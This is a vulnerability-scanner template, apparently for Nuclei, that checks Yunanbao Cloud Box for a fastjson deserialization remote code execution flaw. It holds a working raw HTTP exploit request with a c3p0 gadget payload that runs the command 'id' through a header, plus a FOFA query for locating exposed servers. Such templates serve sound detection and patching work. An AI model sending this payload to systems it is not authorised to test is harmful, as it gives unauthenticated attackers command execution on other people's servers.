id: yunanbao-rce

info:
  name: Yunanbao Cloud Box FastJson - Deserialization Remote Code Execution
  author: DhiyaneshDK
  severity: critical
  description: |
    The authService interface of Cloud Box uses the vulnerable fastjson component. Unauthorized attackers can launch attacks on Cloud Box through the fastjson serialization vulnerability to obtain server permissions.
  reference:
    - https://github.com/wy876/POC/blob/main/%E4%BA%91%E5%8C%A3%E5%AD%90%E5%A0%A1%E5%9E%92%E6%9C%BAfastjson%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="云安宝-云匣子"
  tags: yunanbao,rce,cloud-box

http:
  - raw:
      - |
        POST /3.0/authService/config HTTP/1.1
        Host: {{Hostname}}
        Cmd: id
        Content-Type: application/json;charset=utf-8
        Origin: {{RootURL}}
        Referer: {{RootURL}}
        Accept-Encoding: gzip

        {
            "a": {
                "@type": "java.lang.Class",
                "val": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
            },
            "b": {
                "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
                "userOverridesAsString": "HexAsciiSerializedMap:;"
            }
        }

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - 'uid=([a-z=0-9() ]+) gid=([a-z=0-9() ]+) groups=([a-z=0-9() ]+)'

      - type: status
        status:
          - 200
